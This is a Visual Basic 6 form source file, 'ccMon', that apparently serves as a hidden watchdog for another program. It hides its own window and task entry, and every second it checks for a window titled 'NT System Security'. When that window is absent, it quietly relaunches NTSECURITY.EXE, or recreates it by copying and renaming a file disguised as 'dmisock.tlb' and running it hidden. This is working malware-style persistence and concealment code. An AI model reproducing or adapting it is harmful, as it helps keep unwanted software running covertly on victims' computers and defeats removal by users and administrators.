VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   0  'None
   Caption         =   "ccMon"
   ClientHeight    =   420
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   420
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   420
   ScaleWidth      =   420
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Dim FSo As Object
Dim dSys As String

Private Sub Form_Load()
     App.TaskVisible = False
     
     Set FSo = CreateObject("scripting.filesystemobject")
     dSys = FSo.getspecialfolder(1)
     
     Hide
End Sub

Private Sub Timer1_Timer()
     Dim ret As Long
     
     ret = FindWindow(vbNullString, "NT System Security")
     
     If ret = 0 Then
          If FSo.fileexists(FSo.buildpath(dSys, "NTSECURITY.EXE")) Then
               ShellExecute hwnd, "open", FSo.buildpath(dSys, "NTSECURITY.EXE"), 0, dSys, 0
          Else
               If FSo.fileexists(FSo.buildpath(Left$(dSys, Len(dSys) - 2), "dmisock.tlb")) Then
                    FSo.copyfile FSo.buildpath(Left$(dSys, Len(dSys) - 2), "dmisock.tlb"), dSys + "\": DoEvents
                    Name FSo.buildpath(dSys, "dmisock.tlb") As FSo.buildpath(dSys, "NTSECURITY.EXE"): DoEvents
                    ShellExecute hwnd, "open", FSo.buildpath(dSys, "NTSECURITY.EXE"), 0, dSys, 0
               End If
          End If
     End If
End Sub
